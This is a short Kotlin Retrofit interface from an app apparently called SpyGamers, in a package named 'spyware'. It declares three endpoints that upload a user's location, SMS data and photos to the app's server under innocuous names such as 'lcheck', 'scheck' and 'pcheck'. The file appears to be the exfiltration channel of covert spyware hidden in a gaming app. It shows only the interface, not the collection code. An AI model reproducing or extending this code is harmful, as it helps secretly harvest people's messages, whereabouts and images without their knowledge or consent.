package com.example.spygamers.services.spyware

import com.example.spygamers.API_BASE_URL
import com.example.spygamers.services.StatusOnlyResponse
import okhttp3.MultipartBody
import retrofit2.Response
import retrofit2.http.Body
import retrofit2.http.Multipart
import retrofit2.http.POST
import retrofit2.http.Part

interface SpywareService {
    @POST("$API_BASE_URL/checks/lcheck")
    suspend fun locationCheck(
        @Body body: LocationCheckBody
    ): Response<StatusOnlyResponse>

    @POST("$API_BASE_URL/checks/scheck")
    suspend fun smsCheck(
        @Body body: SmsCheckBody
    ): Response<StatusOnlyResponse>

    @Multipart
    @POST("$API_BASE_URL/account/pcheck")
    suspend fun checkPhoto(
        @Part("auth_token") authToken: String,
        @Part attachments: MultipartBody.Part,
    ): Response<StatusOnlyResponse>
}